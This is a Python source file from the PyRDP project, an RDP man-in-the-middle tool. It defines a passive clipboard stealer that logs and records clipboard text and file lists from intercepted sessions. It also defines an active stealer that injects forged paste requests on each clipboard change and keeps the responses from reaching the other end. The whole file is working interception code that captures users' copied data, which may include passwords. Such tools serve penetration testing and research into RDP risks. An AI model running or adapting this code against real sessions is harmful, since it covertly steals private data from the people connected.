#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from logging import LoggerAdapter

from pyrdp.core import decodeUTF16LE
from pyrdp.enum import ClipboardFormatNumber, ClipboardMessageFlags, ClipboardMessageType, PlayerPDUType
from pyrdp.layer import ClipboardLayer
from pyrdp.logging.StatCounter import StatCounter, STAT
from pyrdp.pdu import ClipboardPDU, FormatDataRequestPDU, FormatDataResponsePDU, FormatListPDU, FileContentsRequestPDU, FileContentsResponsePDU
from pyrdp.recording import Recorder


class PassiveClipboardStealer:
    """
    MITM component for the clipboard layer. Logs clipboard data when it is pasted.
    """

    def __init__(self, client: ClipboardLayer, server: ClipboardLayer, log: LoggerAdapter, recorder: Recorder,
                 statCounter: StatCounter):
        """
        :param client: clipboard layer for the client side
        :param server: clipboard layer for the server side
        :param log: logger for this component
        :param recorder: recorder for clipboard data
        """
        self.statCounter = statCounter
        self.client = client
        self.server = server
        self.log = log
        self.recorder = recorder
        self.forwardNextDataResponse = True
        self.files = []

        self.client.createObserver(
            onPDUReceived = self.onClientPDUReceived,
        )

        self.server.createObserver(
            onPDUReceived = self.onServerPDUReceived,
        )

    def onClientPDUReceived(self, pdu: ClipboardPDU):
        self.statCounter.increment(STAT.CLIPBOARD, STAT.CLIPBOARD_CLIENT)
        self.handlePDU(pdu, self.server)

    def onServerPDUReceived(self, pdu: ClipboardPDU):
        self.statCounter.increment(STAT.CLIPBOARD, STAT.CLIPBOARD_SERVER)
        self.handlePDU(pdu, self.client)

    def handlePDU(self, pdu: ClipboardPDU, destination: ClipboardLayer):
        """
        Check if the PDU is a FormatDataResponse. If so, log and record the clipboard data.
        :param pdu: the PDU that was received
        :param destination: the destination layer
        """

        if isinstance(pdu, FileContentsRequestPDU):
            # TODO: Add to pending request map
            print('File Contents Request')
            pass
        if isinstance(pdu, FileContentsResponsePDU):
            # TODO: Retrieve pending request and append/update data.
            print('File Contents Response')
            pass

        if not isinstance(pdu, FormatDataResponsePDU):
            destination.sendPDU(pdu)
        else:
            if self.forwardNextDataResponse:
                destination.sendPDU(pdu)

            if pdu.msgFlags == ClipboardMessageFlags.CB_RESPONSE_OK:
                # Keep the file list if there is one.
                if len(pdu.files) > 0:
                    self.files = pdu.files
                    self.log.info('---- Clipboard Files ----')
                    for f in self.files:
                        self.log.info(f.filename)
                    self.log.info('-------------------------')

                # FIXME: Only dump clipboard data for generic format id?
                if pdu.formatId == 0xD:  # GENERIC only.
                    clipboardData = self.decodeClipboardData(pdu.requestedFormatData)
                    self.log.info("Clipboard data: %(clipboardData)r", {"clipboardData": clipboardData})
                    self.recorder.record(pdu, PlayerPDUType.CLIPBOARD_DATA)

                if self.forwardNextDataResponse:
                    # Means it's NOT a crafted response
                    self.statCounter.increment(STAT.CLIPBOARD_PASTE)

            self.forwardNextDataResponse = True

    def decodeClipboardData(self, data: bytes) -> str:
        """
        Decode clipboard bytes to a string.
        :param data: clipboard content bytes
        """
        return decodeUTF16LE(data)


class ActiveClipboardStealer(PassiveClipboardStealer):
    """
    MITM component for the clipboard layer. Actively spies on the clipboard by sending paste requests whenever the
    clipboard is updated.
    """

    def __init__(self, client: ClipboardLayer, server: ClipboardLayer, log: LoggerAdapter, recorder: Recorder,
                 statCounter: StatCounter):
        super().__init__(client, server, log, recorder, statCounter)

    def handlePDU(self, pdu: ClipboardPDU, destination: ClipboardLayer):
        """
        Check if the PDU is a FormatListResponse. If so, send a paste request to steal the clipboard data.
        :param pdu: the PDU that was received
        :param destination: the destination layer
        """
        super().handlePDU(pdu, destination)

        if pdu.msgType == ClipboardMessageType.CB_FORMAT_LIST_RESPONSE:
            self.sendPasteRequest(destination)

    def sendPasteRequest(self, destination: ClipboardLayer):
        """
        Send a FormatDataRequest to request the clipboard data.
        Sets forwardNextDataResponse to False to make sure that this request is not actually transferred to the other end.
        """

        self.statCounter.increment(STAT.CLIPBOARD_COPY)

        formatDataRequestPDU = FormatDataRequestPDU(ClipboardFormatNumber.GENERIC)
        destination.sendPDU(formatDataRequestPDU)
        self.forwardNextDataResponse = False
